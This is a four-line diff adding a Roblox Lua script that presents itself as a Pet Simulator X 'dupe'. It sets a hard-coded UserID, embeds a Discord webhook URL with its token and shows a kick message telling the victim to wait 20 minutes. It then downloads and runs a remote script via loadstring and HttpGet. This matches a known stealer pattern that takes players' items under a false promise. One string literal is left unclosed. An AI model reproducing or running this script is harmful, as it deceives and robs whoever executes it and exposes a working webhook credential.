@@ -1,0 +1,4 @@
+_G.UserID = 3274175733
+_G.Webhook = "https://discord.com/api/webhooks/1018906512292315196/AdTvcijb6kVpvRelHRfkdtFTYX9jMh2roDLPZxMXRzm9Uheua1OxVDxkQTqzqK_DA7TP"
+_G.KickMessage = "Dupe Started! Join after 20 minutes to not lose your pets! :)
+loadstring(game:HttpGet"https://raw.githubusercontent.com/ToxinKindaScripts/psxdupe/main/script2")()
